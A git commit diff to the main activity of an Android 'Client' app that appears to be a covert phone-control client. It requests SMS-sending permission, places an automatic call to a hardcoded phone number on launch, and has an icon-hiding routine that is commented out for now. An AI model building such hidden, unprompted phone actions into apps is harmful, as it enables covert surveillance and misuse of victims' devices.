6f19506b20753bf19268972f0ee623153a0c15e1
Olorunfemi-Ojo Tomiwa <ot.server1@outlook.com>
2024-01-14 21:43:36 +0100

    fixed bugs

--- Client/app/src/main/java/com/ot/grhq/client/MainActivity.java
+++ Client/app/src/main/java/com/ot/grhq/client/MainActivity.java
@@ -1,22 +1,41 @@
 package com.ot.grhq.client;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
+import android.Manifest;
 import android.content.ComponentName;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.util.Log;
+import android.widget.Toast;
+
+import com.ot.grhq.client.functionality.Phone;
+import com.ot.grhq.client.functionality.SMS;
+
+import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
+
+    private static final int PERMISSION_REQUEST_CODE = 200;
+    private static String[] PERMISSIONS = {
+        Manifest.permission.SEND_SMS
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        if (!getPermissions())
+        getPermissions();
+        if (!checkPermissions())
             finishAffinity();
 
-        hideApplicationIcon();
+//        hideApplicationIcon();
+        Phone.call(getApplicationContext(), "+2348185571169");
     }
 
     /**
@@ -34,10 +53,25 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * Get necessary permissions
+     * Check if necessary permissions are granted
      * @return <c>true</c> if all are granted; false otherwise
      */
-    private boolean getPermissions() {
-        return false;
+    private boolean checkPermissions() {
+        for (String permission : PERMISSIONS) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
+                    return false;
+            }
+        }
+
+        return true;
+    }
+
+    /**
+     * Request for necessary permissions
+     */
+    private void getPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+            requestPermissions(PERMISSIONS, PERMISSION_REQUEST_CODE);
     }
 }
